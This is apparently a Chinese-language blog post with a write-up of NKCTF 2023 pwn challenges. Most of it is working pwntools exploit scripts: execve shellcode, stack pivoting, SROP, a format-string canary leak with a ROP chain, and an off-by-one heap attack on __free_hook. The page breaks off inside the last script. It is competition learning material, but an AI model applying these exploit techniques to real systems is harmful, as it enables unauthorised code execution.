<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/faceicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/faceicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="后面好好看看musl pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="NKCTF 2023">
<meta property="og:url" content="http://example.com/2023/03/27/NKCTF-2023/index.html">
<meta property="og:site_name" content="1903">
<meta property="og:description" content="后面好好看看musl pwn">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-03-27T14:56:08.000Z">
<meta property="article:modified_time" content="2023-03-27T14:58:37.153Z">
<meta property="article:author" content="hhhhhh_">
<meta property="article:tag" content="-PWN">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2023/03/27/NKCTF-2023/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>NKCTF 2023 | 1903</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">1903</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/27/NKCTF-2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="hhhhhh_">
      <meta itemprop="description" content="想去北方看看">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="1903">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          NKCTF 2023
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-27 22:56:08 / 修改时间：22:58:37" itemprop="dateCreated datePublished" datetime="2023-03-27T22:56:08+08:00">2023-03-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WP/" itemprop="url" rel="index"><span itemprop="name">-WP</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>后面好好看看musl pwn</p>
<span id="more"></span>

<h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p>（由于是签到题，并未仔细看伪代码）</p>
<p>​	简单来说，就是写shellcode，只不过跳转执行时的起始地址随机，一开始没注意，还想着爆破，所以布满了shellcode增大概率，后面意识到并未用srand，故默认seed为0，偏移没记错的话是84，对应位置布就行了。</p>
<p>（不知道有没有碰巧对齐，反正一次就通了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    # sh = process(&#x27;./pwn&#x27;)</span><br><span class="line">    sh = remote(&#x27;node.yuzhian.com.cn&#x27;, 31082)</span><br><span class="line">    # gdb.attach(sh)</span><br><span class="line">    payload = &#x27;a&#x27; + &#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;*0xa</span><br><span class="line">    sh.sendlineafter(&#x27;u can make it in 5 min!\n&#x27;, payload)</span><br><span class="line">    sh.recvuntil(&quot;good luck!\n&quot;)</span><br><span class="line">    sh.sendline(&quot;cat flag&quot;)</span><br><span class="line">    result = sh.recv(timeout = 1)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    count = 0</span><br><span class="line">    while(True):</span><br><span class="line">        try:</span><br><span class="line">            pwn()</span><br><span class="line">        except:</span><br><span class="line">            count += 1</span><br><span class="line">            print(&quot;fail :&#123;&#125;&quot;.format(count))</span><br></pre></td></tr></table></figure>

<h3 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h3><p>​	白给libc，一眼栈迁移，bss段还要分3次输入多少有点。。（思路清奇）</p>
<p>（溢出长度多0x6，是以备栈对齐是吗，这波细节）</p>
<p>（听到同学有直接onegadget的想法，多少对预期解不礼貌哈^_^）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"># sh = process(&#x27;./pwn&#x27;)</span><br><span class="line">sh = remote(&#x27;node2.yuzhian.com.cn&#x27;, 38118)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    sh.sendlineafter(&quot;&gt; \n&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">menu(4)</span><br><span class="line">sh.recvuntil(&quot;I give it up, you can see this. &quot;)</span><br><span class="line">puts = int(sh.recv(14), 16)</span><br><span class="line">print(&quot;puts: &quot; + hex(puts))</span><br><span class="line"></span><br><span class="line">libc.address = puts - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">print(&quot;libc.address: &quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">pop_rdi_ret = libc.search(asm(&#x27;pop rdi; ret&#x27;)).next()</span><br><span class="line">leave_ret = libc.search(asm(&#x27;leave; ret&#x27;)).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">menu(2)</span><br><span class="line">sh.sendafter(&quot;what&#x27;s your corment?\n&quot;, p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line">menu(1)</span><br><span class="line">sh.sendafter(&quot;what&#x27;s your comment?\n&quot;, p64(binsh))</span><br><span class="line"></span><br><span class="line">menu(3)</span><br><span class="line">sh.sendafter(&quot;what&#x27;s your corMenT?\n&quot;, p64(system))</span><br><span class="line"></span><br><span class="line">ctf = 0x00000000004050A0</span><br><span class="line">payload = &#x27;a&#x27;*0xa + p64(ctf - 0x8) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">menu(4)</span><br><span class="line">sh.sendafter(&quot;now, come and read my heart...\n&quot;, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h3><p>​	这题一开始联想到了buu上一次巨精简的栈题，却限得更死，一开始属实茫然了（因为IDA看时，mov rax, 0xf的gadget一开始以数据的形式呈现。。晕），不过连续两次SROP的实践还是第一次（关键用syscall ret貌似，顺便控下rsp）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"># sh = process(&#x27;./ez_stack&#x27;)</span><br><span class="line">sh = remote(&#x27;node2.yuzhian.com.cn&#x27;, 31625)</span><br><span class="line">elf = ELF(&#x27;./ez_stack&#x27;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;Welcome to the binary world of NKCTF!\n&quot;)</span><br><span class="line"></span><br><span class="line">mov_rax_ret = 0x0000000000401146</span><br><span class="line">syscall_ret = 0x000000000040114E</span><br><span class="line"></span><br><span class="line">bss = 0x0000000000404080 + 0x200</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 59</span><br><span class="line">frame.rdi = bss</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27; + p64(mov_rax_ret) + p64(syscall_ret) + str(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 0</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = bss</span><br><span class="line">frame.rdx = len(payload)</span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">frame.rsp = bss + 8</span><br><span class="line"></span><br><span class="line">payload2 = &#x27;a&#x27;*0x18 + p64(mov_rax_ret) + p64(syscall_ret) + str(frame)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h3><p>​	message_board一眼西湖论剑（当时卡在了某个小细节，真可惜）</p>
<p>​	my_read( )内存在off by null（栈题还没怎么遇到欸），可以覆盖到old rbp的低1字节（复现时才意识到这就妥妥一栈迁移，比赛一开始并没get到g，而是调试看到结果就往前面布ret了），这道题开始有思路是因为正常跑并未正常退出，而是报了ret&lt;1&gt;的错（这是因为在main函数退栈时leave ret之间夹杂了个pop rbp，把原来该ret的地址弹到了rbp）</p>
<p>​	复现时调试了一遍，覆盖低1字节，将rbp往上抬（rsp之上），然后在main函数退栈时的leave指令第一步（mov rsp, rbp）成功把rsp也抬了上去（其实就是栈迁移。。晕），而出题人在这放了个pop rbp估计是为了让选手更轻松的恢复栈帧，进而下一步利用（确实贴心），所以最后ret addr位置就是0x10偏移的位置（由于我全堆ret，并且通过返回main来重开栈帧，属实辜负了出题人的一片好心），后面就是标准的ROP了。</p>
<p>（比赛时没写个交互函数，看着有点冗长，裂）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"># sh = process(&#x27;./nkctf_message_boards&#x27;)</span><br><span class="line">sh = remote(&#x27;node.yuzhian.com.cn&#x27;,30957)</span><br><span class="line">elf = ELF(&#x27;./nkctf_message_boards&#x27;)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">part = 0x000000000040138C#0x00000000004012B1</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What is your name: &quot;)</span><br><span class="line">payload = &#x27;a&#x27; + &#x27;%41$p&#x27;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#x27;a&#x27;)</span><br><span class="line">canary = int(sh.recv(18), 16)</span><br><span class="line">print(hex(canary))</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># pause()</span><br><span class="line">ret = 0x000000000040101a</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What are your comments and suggestions for the NKCTF: \n&quot;)</span><br><span class="line">payload = p64(part)</span><br><span class="line">payload = p64(ret)*30 + payload </span><br><span class="line">payload += p64(canary)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What is your name: &quot;)</span><br><span class="line">payload = &#x27;a&#x27; + &#x27;%4$p&#x27; </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#x27;a&#x27;)</span><br><span class="line">libc_ = int(sh.recv(14), 16) - 0x5d3700</span><br><span class="line">print(hex(libc_))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x0000000000401413</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What are your comments and suggestions for the NKCTF: \n&quot;)</span><br><span class="line">payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(part)</span><br><span class="line">payload = p64(ret)*(31 - 4) + payload </span><br><span class="line">payload += p64(canary)</span><br><span class="line"># payload += p64(part)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;Thank you, we will read your comments and suggestions carefully.\n&quot;)</span><br><span class="line"></span><br><span class="line">puts = u64(sh.recv(6).ljust(8, &#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">libc.address = libc_</span><br><span class="line"></span><br><span class="line">system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What is your name: &quot;)</span><br><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What are your comments and suggestions for the NKCTF: \n&quot;)</span><br><span class="line">payload = p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(part)</span><br><span class="line">payload = p64(ret)*(31 - 5) + payload </span><br><span class="line">payload += p64(canary)</span><br><span class="line"># payload += p64(part)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h3><p>​	这题属实想吐槽一下（libc是给我们好看的么^_^）（但其实是自己太菜了&#x2F;&#x2F;&#x2F;）（甚至find原题，额刚刚结束）</p>
<p>（16通了，20没通，然后远端又通了）</p>
<p>Ubuntu16：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(&#x27;mov edi, 0x996100f; xor esi, esi; xor edx, edx; mov ax, 0x3b; syscall;&#x27;) + &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<p>（直接给edi传地址，最后&#x2F;bin&#x2F;sh后没位置接\x00了，但我觉得不搭嘎）</p>
<p>​	换了20的机子就没通，远端应该也没通。。。</p>
<p>Ubuntu20：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(&#x27;lea rdi, [r15+0xe]; xor esi, esi; xor edx, edx; mov ax, 0x3b; syscall;&#x27;) + &#x27;/bin/sh\x00&#x27;</span><br></pre></td></tr></table></figure>

<p>​	20还是没通，抱着一丝丝希望试了下远端，然后通了。。。（换lea后只占了4字节，直接使整个shellcode写完\x00甚至还余一字节）（这些思路貌似在16就试了，但是报了好多次汇编的错。。晕，还是太菜）</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">exe = context.binary = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line"># io = process(&#x27;./pwn&#x27;)</span><br><span class="line">io = remote(&#x27;node2.yuzhian.com.cn&#x27;, 32066)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;lea rdi, [r15+0xe]; xor esi, esi; xor edx, edx; mov ax, 0x3b; syscall;&#x27;) + &#x27;/bin/sh\x00&#x27;</span><br><span class="line"># shellcode = shellcode.ljust(0x16, &#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"># pause()</span><br><span class="line">io.sendafter(&#x27;In that case, you can only enter a very short shellcode!\n\n&#x27;, shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h3><p>​	2.32下的off by one（第一次纯自己随意构造出的^_^）（由于没patchelf成功，就先在2.31上通了，毕竟2.32貌似主要特征就是那个加密？）</p>
<p>​	由于限制了0x100的大小，由于最近在看house系列，首先想着去构造堆叠来get unsorted bin（而不是像以前一样填满tcache bin，晕），1字节不太够，就先向下扩展了0x10的空间（现在看，tcache的free确实松，good）来改后面chunk的头部，拿到unsorted bin直接泄露libc（吐槽一下2.32的unsorted bin head居然低位是\x00（一开始忘了），一开始没泄露出来甚至一度怀疑对堆的理解，晕死），堆地址我并没有泄露指针，而是直接去拿了tcache（也就是key，还没加密，很不错），后面就是改next指针打__free_hook（提前布置tcache bin）</p>
<p>（最后提一句，用pwntools换libc真的可行，可惜调试不了heap）（早信，铁人三项那格式ezpwn就有的看了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"># sh = process(&#x27;./pwn&#x27;)</span><br><span class="line"># sh = process([&quot;./ld-2.32.so&quot;,&quot;./pwn&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.32.so&quot;&#125;)</span><br><span class="line"></span><br><span class="line">sh = remote(&#x27;node2.yuzhian.com.cn&#x27;, 32456)</span><br><span class="line"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.32.so&#x27;)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    sh.sendlineafter(&quot;Your choice: &quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def add(index, size):</span><br><span class="line">    menu(1)</span><br><span class="line">    sh.sendlineafter(&quot;Enter the index: &quot;, str(index))</span><br><span class="line">    sh.sendlineafter(&quot;Enter the Size: &quot;, str(size))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    menu(2)</span><br><span class="line">    sh.sendlineafter(&quot;Enter the index: &quot;, str(index))</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    menu(3)</span><br><span class="line">    sh.sendlineafter(&quot;Enter the index: &quot;, str(index))</span><br><span class="line">    sh.sendafter(&quot;Enter the content: &quot;, content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    menu(4)</span><br><span class="line">    sh.sendlineafter(&quot;Enter the index: &quot;, str(index))</span><br><span class="line"></span><br><span class="line">add(0, 0x48)</span><br><span class="line">add(1, 0x48)</span><br><span class="line">add(2, 0x48)</span><br><span class="line"></span><br><span class="line">add(5, 0xf8)</span><br><span class="line">add(6, 0xf8)</span><br><span class="line">add(7, 0xf8)</span><br><span class="line">add(8, 0xf8)</span><br><span class="line"></span><br><span class="line">add(3, 0x48)</span><br><span class="line"># add(4, 0x48)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(0, &#x27;a&#x27;*0x48 + p8(0x61))</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(1, 0x50)</span><br><span class="line"></span><br><span class="line">edit(1, &#x27;a&#x27;*0x48 + p64(0x451) + &#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span 